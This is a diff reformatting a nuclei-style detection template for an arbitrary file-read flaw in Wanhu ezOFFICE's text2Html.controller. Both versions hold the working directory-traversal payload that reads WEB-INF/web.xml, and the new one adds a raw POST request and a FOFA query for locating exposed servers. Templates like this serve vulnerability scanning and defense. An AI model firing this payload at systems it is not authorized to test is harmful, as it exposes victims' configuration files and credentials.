@@ -1,34 +1,36 @@
-# 来源: afrog（转换自 afrog/xray 表达式 POC）
+id: wanhu-ezoffice-text2html-fileread
+
+info:
+  name: 万户 ezOFFICE text2Html 任意文件读取
+  author: zan8in
+  severity: high
+  description: |
+    万户 ezOFFICE /defaultroot/convertFile/text2Html.controller 的 saveFileName 参数可目录穿越读取 WEB-INF/web.xml。
+  metadata:
+    verified: true
+    max-request: 1
+    fofa-query: app="万户网络-ezOFFICE"
+  tags: wanhu,ezoffice,lfi
+
 http:
-  - body: saveFileName=123456/../../../../WEB-INF/web.xml&moduleName=html
+  - raw:
+      - |
+        POST /defaultroot/convertFile/text2Html.controller HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        saveFileName=123456/../../../../WEB-INF/web.xml&moduleName=html
+
+    matchers-condition: and
     matchers:
-      - type: status
-        status:
-          - 200
       - type: word
         part: body
         words:
-          - web-app xmlns=
-        condition: and
+          - "web-app xmlns="
       - type: word
         part: header
         words:
-          - text/html
-        condition: and
-    method: POST
-    path:
-      - '{{BaseURL}}/defaultroot/convertFile/text2Html.controller'
-id: wanhu-ezoffice-text2html-fileread
-info:
-  author: zan8in
-  description: |-
-    万户ezOFFICE协同管理平台是一个综合信息基础应用平台。 万户协同办公平台ezoffice text2Html接口存在任意文件读取漏洞。
-    Fofa: app="万户网络-ezOFFICE"
-  metadata:
-    argus-execution-class: detection
-    argus-import-license: MIT License
-    argus-import-source: afrog
-    argus-risk-level: high
-  name: 万户协同办公平台ezoffice text2Html接口任意文件读取
-  severity: high
-  tags: wanhu,ezoffice,text2html,fileread,argus-import
+          - "text/html"
+      - type: status
+        status:
+          - 200
